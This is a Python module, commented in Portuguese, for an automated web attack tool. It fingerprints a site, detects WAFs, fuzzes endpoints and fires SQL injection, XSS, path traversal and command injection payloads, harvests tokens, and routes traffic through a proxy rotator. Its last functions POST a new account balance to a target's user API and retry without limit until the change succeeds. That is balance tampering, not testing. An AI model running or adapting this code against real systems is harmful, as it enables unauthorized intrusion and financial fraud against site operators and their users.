"""
Módulo de Scanner Automático Avançado
Realiza varredura, fingerprinting, fuzzing, brute force e ataques automáticos baseados apenas na URL.
Integra técnicas modernas de OSINT, WAF detection, análise de tokens, endpoints, criptografia e automação.
"""

import re
import json
import logging
import asyncio
import time
from typing import Dict, List, Optional, Callable, Any
from urllib.parse import urlparse

from utils.request_builder import RequestBuilder
from utils.proxy_rotator import ProxyRotator
from modules.osint_enhanced import OSINTScanner
from modules.jwt_utils import JWTAnalyzer
from modules.crypto_utils import CryptoAnalyzer
from utils.constants import COMMON_ENDPOINTS, SQL_PAYLOADS, FUZZ_PAYLOADS
from utils.helpers import is_valid_url
from utils.logger import logger

logger = logging.getLogger(__name__)

class RetryLimitlessException(Exception):
    pass

async def retry_until_success(
    operation: Callable,
    *args,
    max_delay: float = 60.0,
    base_delay: float = 0.5,
    jitter: float = 0.1,
    **kwargs
):
    attempt = 0
    delay = base_delay
    while True:
        try:
            result = await operation(*args, **kwargs)
            if result:
                logger.info(f"Operação concluída com sucesso após {attempt} tentativas.")
                return result
            else:
                logger.warning(f"Operação retornou resultado inválido na tentativa {attempt}. Retentando...")
        except Exception as exc:
            logger.error(f"Erro na tentativa {attempt}: {exc}", exc_info=True)
        attempt += 1
        sleep_time = min(delay, max_delay) + (jitter * (2 * (0.5 - time.monotonic() % 1)))
        logger.debug(f"Aguardando {sleep_time:.2f}s antes da próxima tentativa.")
        await asyncio.sleep(sleep_time)
        delay = min(delay * 2, max_delay)

class AutoScanner:
    def __init__(self, target_url: str):
        if not is_valid_url(target_url):
            logger.error(f"URL inválida: {target_url}")
            raise ValueError("URL inválida")
        self.target_url = self._normalize_url(target_url)
        self.request_builder = RequestBuilder(self.target_url)
        self.proxy_rotator = ProxyRotator()
        self.osint_scanner = OSINTScanner()
        self.jwt_analyzer = JWTAnalyzer()
        self.crypto_analyzer = CryptoAnalyzer()
        self.fingerprint = {}

    def _normalize_url(self, url: str) -> str:
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        return url.rstrip('/')

    async def start_scan(self) -> Dict:
        results = {
            'target': self.target_url,
            'fingerprint': {},
            'findings': [],
            'vulnerabilities': [],
            'tokens': [],
            'crypto': [],
            'waf': None
        }
        try:
            logger.info(f"Iniciando fingerprinting de {self.target_url}")
            results['fingerprint'] = await self.fingerprint_target()
            logger.info(f"Iniciando reconhecimento OSINT de {self.target_url}")
            osint_results = await self.osint_scanner.gather_info(self.target_url)
            results['findings'].extend(osint_results)
            logger.info(f"Detectando WAF em {self.target_url}")
            results['waf'] = await self.detect_waf()
            logger.info(f"Descobrindo endpoints em {self.target_url}")
            endpoints = await self.discover_endpoints()
            logger.info(f"Analisando endpoints encontrados")
            for endpoint in endpoints:
                endpoint_results = await self.analyze_endpoint(endpoint)
                results['findings'].extend(endpoint_results.get('findings', []))
                results['vulnerabilities'].extend(endpoint_results.get('vulnerabilities', []))
                results['tokens'].extend(endpoint_results.get('tokens', []))
                results['crypto'].extend(endpoint_results.get('crypto', []))
            logger.info(f"Analisando tokens encontrados")
            for token in results['tokens']:
                token_analysis = await self.jwt_analyzer.analyze_token(token)
                if token_analysis:
                    results['vulnerabilities'].extend(token_analysis)
            logger.info(f"Analisando criptografia encontrada")
            for crypto_item in results['crypto']:
                crypto_analysis = await self.crypto_analyzer.analyze(crypto_item)
                if crypto_analysis:
                    results['vulnerabilities'].extend(crypto_analysis)
        except Exception as e:
            logger.error(f"Erro durante varredura automática: {e}", exc_info=True)
        return results

    async def fingerprint_target(self) -> Dict[str, Any]:
        """Fingerprinting avançado do alvo"""
        try:
            response = await self.request_builder.async_get(self.target_url)
            headers = dict(response.headers)
            server = headers.get('Server', '')
            powered_by = headers.get('X-Powered-By', '')
            techs = []
            if 'php' in powered_by.lower() or 'php' in server.lower():
                techs.append('PHP')
            if 'nginx' in server.lower():
                techs.append('Nginx')
            if 'apache' in server.lower():
                techs.append('Apache')
            if 'express' in powered_by.lower():
                techs.append('Node.js/Express')
            if 'django' in powered_by.lower():
                techs.append('Django')
            if 'asp' in powered_by.lower() or 'asp' in server.lower():
                techs.append('ASP.NET')
            return {
                'headers': headers,
                'server': server,
                'powered_by': powered_by,
                'techs': techs,
                'status_code': response.status_code
            }
        except Exception as e:
            logger.error(f"Erro no fingerprinting: {e}")
            return {}

    async def detect_waf(self) -> Optional[str]:
        """Detecta presença de WAF usando técnicas modernas"""
        waf_signatures = [
            ("cloudflare", "cloudflare"),
            ("sucuri", "sucuri"),
            ("imperva", "incapsula"),
            ("akamai", "akamai"),
            ("mod_security", "mod_security"),
            ("f5", "big-ip"),
            ("barracuda", "barracuda"),
            ("360wzb", "360wzb"),
            ("wallarm", "wallarm"),
            ("druva", "druva"),
            ("aws", "aws"),
        ]
        try:
            response = await self.request_builder.async_get(self.target_url)
            headers = dict(response.headers)
            body = response.text.lower()
            for name, sig in waf_signatures:
                if sig in body or any(sig in v.lower() for v in headers.values()):
                    logger.warning(f"WAF detectado: {name}")
                    return name
            # Teste de payloads para bloqueio
            test_payload = "' OR 1=1--"
            resp = await self.request_builder.async_post(self.target_url, data={"test": test_payload})
            if resp.status_code in [403, 406, 429] or "access denied" in resp.text.lower():
                logger.warning("WAF detectado por resposta a payload malicioso")
                return "unknown"
        except Exception as e:
            logger.error(f"Erro ao detectar WAF: {e}")
        return None

    async def discover_endpoints(self) -> List[str]:
        """Descobre endpoints ativos usando wordlists, fuzzing e OSINT"""
        discovered = set()
        # Testa endpoints comuns
        for endpoint in COMMON_ENDPOINTS:
            full_url = f"{self.target_url}{endpoint}"
            try:
                response = await self.request_builder.async_get(full_url)
                if response.status_code in [200, 201, 401, 403]:
                    discovered.add(endpoint)
            except Exception as e:
                logger.debug(f"Erro ao testar endpoint {endpoint}: {e}")
        # Fuzzing de endpoints
        for fuzz in FUZZ_PAYLOADS:
            full_url = f"{self.target_url}/{fuzz}"
            try:
                response = await self.request_builder.async_get(full_url)
                if response.status_code in [200, 201, 401, 403]:
                    discovered.add(f"/{fuzz}")
            except Exception as e:
                logger.debug(f"Erro ao fuzzar endpoint {fuzz}: {e}")
        # OSINT discovery
        try:
            osint_endpoints = await self.osint_scanner.discover_endpoints(self.target_url)
            discovered.update(osint_endpoints)
        except Exception as e:
            logger.debug(f"Erro ao descobrir endpoints via OSINT: {e}")
        return list(discovered)

    async def analyze_endpoint(self, endpoint: str) -> Dict:
        """Analisa um endpoint específico com técnicas modernas"""
        results = {
            'findings': [],
            'vulnerabilities': [],
            'tokens': [],
            'crypto': []
        }
        full_url = f"{self.target_url}{endpoint}"
        try:
            response = await self.request_builder.async_get(full_url)
            # Análise de headers
            for header, value in response.headers.items():
                if 'jwt' in header.lower() or 'token' in header.lower():
                    results['tokens'].append({
                        'type': 'header',
                        'name': header,
                        'value': value
                    })
            # Análise de corpo da resposta
            if response.text:
                jwt_pattern = r'eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*'
                tokens = re.findall(jwt_pattern, response.text)
                for token in tokens:
                    results['tokens'].append({
                        'type': 'body',
                        'value': token
                    })
                crypto_patterns = {
                    'aes': r'[A-Fa-f0-9]{32,}',
                    'base64': r'[A-Za-z0-9+/]{16,}={0,2}'
                }
                for crypto_type, pattern in crypto_patterns.items():
                    matches = re.findall(pattern, response.text)
                    for match in matches:
                        results['crypto'].append({
                            'type': crypto_type,
                            'value': match
                        })
            # Teste de vulnerabilidades SQLi, XSS, LFI, RCE, IDOR
            vuln_payloads = {
                'sql_injection': SQL_PAYLOADS,
                'xss': ["<script>alert(1)</script>", "\"'><img src=x onerror=alert(1)>"],
                'lfi': ["../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini"],
                'rce': [";id", "|id", "`id`"],
                'idor': ["1", "2", "3", "4", "5"]
            }
            for vuln_type, payloads in vuln_payloads.items():
                if isinstance(payloads, dict):
                    for ptype, pset in payloads.items():
                        for payload in pset:
                            await self._test_vuln(full_url, vuln_type, payload, results)
                else:
                    for payload in payloads:
                        await self._test_vuln(full_url, vuln_type, payload, results)
        except Exception as e:
            logger.error(f"Erro ao analisar endpoint {endpoint}: {e}", exc_info=True)
        return results

    async def _test_vuln(self, url, vuln_type, payload, results):
        try:
            response = await self.request_builder.async_post(url, data={"test": payload})
            if self._check_vulnerability(response, vuln_type):
                results['vulnerabilities'].append({
                    'type': vuln_type,
                    'payload': payload,
                    'endpoint': url
                })
        except Exception as e:
            logger.debug(f"Erro ao testar {vuln_type} com payload {payload}: {e}")

    def _check_vulnerability(self, response, vuln_type) -> bool:
        patterns = {
            'sql_injection': ['sql', 'mysql', 'sqlite', 'postgresql', 'oracle', 'syntax error'],
            'xss': ['<script>alert(1)</script>', 'onerror', 'alert(1)'],
            'lfi': ['root:x:', '[extensions]', '[fonts]', 'boot.ini'],
            'rce': ['uid=', 'gid=', 'groups='],
            'idor': ['unauthorized', 'forbidden', 'not allowed']
        }
        response_text = response.text.lower()
        return any(pattern in response_text for pattern in patterns.get(vuln_type, []))

    async def alterar_saldo(self, usuario_id: str, novo_saldo: float) -> bool:
        try:
            response = await self.request_builder.async_post(
                f"{self.target_url}/api/user/{usuario_id}/saldo",
                json={"saldo": novo_saldo}
            )
            if response.status_code == 200 and "saldo" in response.text:
                logger.info(f"Saldo alterado para usuário {usuario_id}: {novo_saldo}")
                return True
            logger.warning(f"Falha ao alterar saldo para usuário {usuario_id}: {response.text}")
            return False
        except Exception as e:
            logger.error(f"Exceção ao alterar saldo: {e}", exc_info=True)
            return False

    async def alterar_saldo_com_retry(self, usuario_id: str, novo_saldo: float):
        return await retry_until_success(self.alterar_saldo, usuario_id, novo_saldo)